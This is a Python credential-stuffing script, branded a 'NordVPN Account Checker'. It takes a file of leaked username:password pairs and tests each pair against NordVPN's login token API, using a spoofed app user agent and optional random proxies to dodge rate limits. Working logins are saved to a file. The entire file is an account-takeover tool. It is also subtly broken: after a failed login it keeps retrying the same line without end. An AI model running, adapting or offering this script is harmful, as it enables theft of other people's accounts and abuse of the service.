import requests as reqs
import os, ctypes, random, easygui
from colorama import Fore, Style, init
from datetime import datetime

init()

def update_win_title(started, hits=0, fails=0, errors=0, current_acc=0, total_acc=0):
    if not started:
        title = f"NordVPN Account Checker by Cal | Enjoy!"
    elif started:
        percentage = int(((current_acc / total_acc) * 100) // 1)
        title = f"NordVPN Account Checker by Cal | Hits: {hits} | Fails: {fails} | Errors: {errors} | {percentage}% Complete"

    ctypes.windll.kernel32.SetConsoleTitleW(title)

def display_title():
    title = r"""

    ███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ███╗   ██╗
    ████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║
    ██╔██╗ ██║██║   ██║██████╔╝██║  ██║██║   ██║██████╔╝██╔██╗ ██║
    ██║╚██╗██║██║   ██║██╔══██╗██║  ██║╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
    ██║ ╚████║╚██████╔╝██║  ██║██████╔╝ ╚████╔╝ ██║     ██║ ╚████║
    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝     ╚═╝  ╚═══╝

    """

    for line in title.splitlines():
        print(line.center(os.get_terminal_size().columns), end="\n")

def main():

    while True:
        os.system("cls")
        display_title()
        update_win_title(started=False)

        ## getting combo file
        print("Please select your <username:password> combination file >> ")
        combo_file = easygui.fileopenbox()

        ## getting proxy file
        while True:
            proxy_choice = str(input("\nWould you like to use proxies? [Y/N] "))

            if proxy_choice.upper() == "Y":
                print("Please select your http proxy file >> ")
                proxy_file = easygui.fileopenbox()
                proxies = open(proxy_file, "r").readlines()

                proxy_use = True
                break

            elif proxy_choice.upper() == "N":
                proxy_use = False
                break

        ## debug mode
        while True:
            debug_choice = str(input("\nWould you like to run in debug mode? [Y/N] "))

            if debug_choice.upper() == "Y":
                debug_mode = True
                break

            elif debug_choice.upper() == "N":
                debug_mode = False
                break
        
        hits = 0
        fails = 0
        errors = 0
        current_account = 0
        total_accounts = len(open(combo_file, "r").readlines())

        try:
            with open(combo_file, "r") as file:

                os.system("cls")
                display_title()
                update_win_title(True, hits, fails, errors, current_account, total_accounts)

                working_accounts = []

                for line in file:
                    while True:
                        try:
                            line = line.strip()
                            combination = line.split(":")

                            headers = {
                                "User-Agent": "NordApp android (playstore/4.1.3) Android 5.1.1"
                            }

                            data = {
                                "username": combination[0],
                                "password": combination[1]
                            }

                            if proxy_use:
                                request = reqs.post("https://api.nordvpn.com/v1/users/tokens", headers=headers, data=data, proxies={"https":f"https://{random.choice(proxies)}"})
                            elif not proxy_use:
                                request = reqs.post("https://api.nordvpn.com/v1/users/tokens", headers=headers, data=data)

                            now = datetime.now().strftime("%H:%M:%S")

                            if request.status_code == 429:
                                if debug_mode:
                                    print(f"{Fore.MAGENTA}[{Fore.WHITE}{now}{Fore.MAGENTA}][ERROR] {request}{Style.RESET_ALL}")

                                errors += 1
                                update_win_title(True, hits, fails, errors, current_account, total_accounts)
                                continue
                            elif request.status_code == 201:
                                hits += 1
                                working_accounts.append(line)
                                current_account += 1
                                update_win_title(True, hits, fails, errors, current_account, total_accounts)
                                print(f"{Fore.GREEN}[{Fore.WHITE}{now}{Fore.GREEN}][HIT] {line}{Style.RESET_ALL}")
                                break
                            elif request.status_code == 401:
                                fails += 1
                                current_account += 1
                                update_win_title(True, hits, fails, errors, current_account, total_accounts)
                                print(f"{Fore.RED}[{Fore.WHITE}{now}{Fore.RED}][FAIL] {line}{Style.RESET_ALL}")

                        except Exception as e:
                            now = datetime.now().strftime("%H:%M:%S")

                            if debug_mode:
                                print(f"{Fore.MAGENTA}[{Fore.WHITE}{now}{Fore.MAGENTA}][ERROR] {type(e)}{Style.RESET_ALL}")

                            errors += 1
                            update_win_title(True, hits, fails, errors, current_account, total_accounts)
                            continue

        except FileNotFoundError:
            print("Combo file doesnt no exist.")

        create_file = open(f"{os.path.dirname(os.getcwd())}\\working.txt", "x")
        create_file.close()

        with open(f"{os.path.dirname(os.getcwd())}\\working.txt", "w") as f:
            for account in working_accounts:
                f.write(account + "\n")

        os.system("cls")
        display_title()

        print(f"All HITS have been stored in a text file at the following location: \n{os.path.dirname(os.getcwd())}\\working.txt")
        print("\nPress 'Return' to exit the program")

        input()
        break

if __name__ == "__main__":
    main()